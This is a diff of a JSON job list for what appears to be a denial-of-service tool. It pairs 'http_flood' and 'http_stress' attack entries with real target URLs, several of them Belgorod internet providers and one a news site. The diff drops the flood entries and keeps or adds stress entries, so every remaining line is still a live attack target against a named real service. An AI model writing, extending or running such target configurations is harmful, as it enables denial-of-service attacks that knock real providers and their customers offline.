@@ -1,20 +1,8 @@
 [
-  {"kind":"http_flood","method":"POST","ip":"127.0.0.1","port": 443, "url": "https://www.31stk.ru/","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://www.31stk.ru/", "body": "fixed_string"},
   {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://www.31stk.ru/"},
-  {"kind":"http_flood","method":"POST","ip":"127.0.0.1","port": 80, "url": "http://internet-belgorod.ru/","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"GET","ip":"127.0.0.1","port": 80, "url": "http://internet-belgorod.ru/", "body": "fixed_string"},
   {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 80, "url": "http://internet-belgorod.ru/"},
-  {"kind":"http_flood","method":"POST","ip":"127.0.0.1","port": 443, "url": "https://inetspace.ru/","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://inetspace.ru/", "body": "fixed_string"},
   {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://inetspace.ru/"},
-  {"kind":"http_flood","method":"XMLRPC","ip":"127.0.0.1","port": 443, "url": "https://belgorod-netbynet.ru/","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"XMLRPC","ip":"127.0.0.1","port": 443, "url": "https://belgorod-netbynet.ru/", "body": "fixed_string"},
-  {"kind":"http_stress","method":"XMLRPC","ip":"127.0.0.1","port": 443, "url": "https://belgorod-netbynet.ru/"},
-  {"kind":"http_flood","method":"POST","ip":"127.0.0.1","port": 443, "url": "https://belrts.ru/","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://belrts.ru/", "body": "fixed_string"},
+  {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://belgorod-netbynet.ru/"},
   {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://belrts.ru/"},
-  {"kind":"http_flood","method":"POST","ip":"127.0.0.1","port": 443, "url": "https://ptoday.ru/","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://ptoday.ru/", "body": "fixed_string"},
   {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://ptoday.ru/"}
 ]
